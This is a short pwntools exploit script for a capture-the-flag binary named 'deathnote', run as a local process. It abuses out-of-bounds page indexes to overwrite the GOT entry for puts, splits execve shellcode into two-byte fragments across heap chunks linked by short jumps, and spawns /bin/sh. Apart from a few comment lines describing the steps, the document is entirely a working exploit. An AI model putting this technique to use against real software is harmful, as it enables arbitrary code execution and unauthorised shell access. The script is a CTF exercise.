# Use those indexs out of bound to override .got puts
# alloc a part of a mem chunk and make fake_puts pointing to this mem
# alloc plenty of mem chunks
# Store shellcode with 2 bytes in a piece in those chunks and use short jmp inserted in the shellcode to connect it.
# call puts(name), pwn!

from pwn import *
from binascii import hexlify

context.os='linux'
context.arch='amd64'

r=process('./deathnote')
r.recvuntil('tell me your name:')
r.sendline('/bin/sh\x00')

def obWriteName(index,size,content):
	r.sendlineafter('choice>>','1')
	r.sendlineafter('Page:',str(index))
	r.sendlineafter('Size:',str(size))
	raw_input()
	r.sendlineafter('Name:',content)
def WriteName(index,size,content):
	r.sendlineafter('choice>>','1')
	r.sendlineafter('Page:',str(index))
	r.sendlineafter('Size:',str(size))
	r.sendlineafter('Name:',content)
def ShowName(index):
	r.sendlineafter('choice>>','3')
	r.sendlineafter('Page:',str(index))
asmcode='''
xor eax,eax;
xor edx,edx;
mov al,59;
syscall;
ret;
'''
shellcode=asm(asmcode)
print asmcode,len(shellcode),hexlify(shellcode)

WriteName(0,4,asm('ret;'))
WriteName(1,4,asm('syscall;')+'\xeb\xdc')
WriteName(2,4,asm('mov al,59;')+'\xeb\xdc')
WriteName(3,4,asm('xor edx,edx;')+'\xeb\xdc')
obWriteName(0xFFFFFFFF-24,4,asm('xor eax,eax;')+'\xeb\xdc')
ShowName(0xFFFFFFFF-3)
r.interactive()
